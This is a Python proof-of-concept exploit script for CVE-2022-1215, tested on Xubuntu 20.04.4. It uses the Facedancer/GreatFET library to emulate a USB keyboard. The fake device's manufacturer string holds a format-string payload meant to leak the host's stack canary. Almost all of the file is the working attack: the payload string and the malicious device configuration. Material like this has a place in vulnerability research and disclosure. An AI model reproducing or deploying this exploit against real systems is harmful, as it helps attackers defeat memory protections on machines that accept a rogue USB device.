#!/usr/bin/env python3
# pylint: disable=unused-wildcard-import, wildcard-import
# /////// ++++++++++++ +++++++++++ +++++++++++ +++++++++++ ++++++++++ \\\\\\\\\\
#               Stack canary leak via CVE-2022-1215, tested on Xubuntu 20.04.4
#                               by: @hyprdude
# ~~~~~ Stack canary leak via format string exploit using GreatFET/Facedancer ~~~~~
#    - OS: Xubuntu 20.04.4, as of 2022-08-13
# \\\\\\\ ++++++++++++ +++++++++++ ++++++++++++ +++++++++++ +++++++++ //////////
import sys
import os
import logging
from facedancer             import devices, main
from facedancer.devices.keyboard import USBKeyboardDevice

prefix = "%1$c%2$c%3$c%4$c%5$c%6$c%7$c%8$c%9$c%10$c%11$c%12$c%13$c%14$c%15$c%16$c%17$c%18$c%19$c%20$c%21$c%22$c"
canary_maybes = "X:%23$p_X:%24$p_X:%25$p" # grep for `X:0x.{14}00`
payload = prefix + canary_maybes

print("[+] reading args from $FSERIAL, $FPRODUCT, and $FMANU env vars")
serial = os.environ.get("FSERIAL", "C"*100)
product = os.environ.get("FPRODUCT", "HYPRODUCT")
manu = os.environ.get("FMANU", payload)

# create the device and connect
DEVICE = USBKeyboardDevice()
DEVICE.serial_number_string = serial
DEVICE.manufacturer_string = manu
DEVICE.product_string = product
DEVICE.product_id = 0x1337
DEVICE.vendor_id = 0x1337
main(DEVICE)
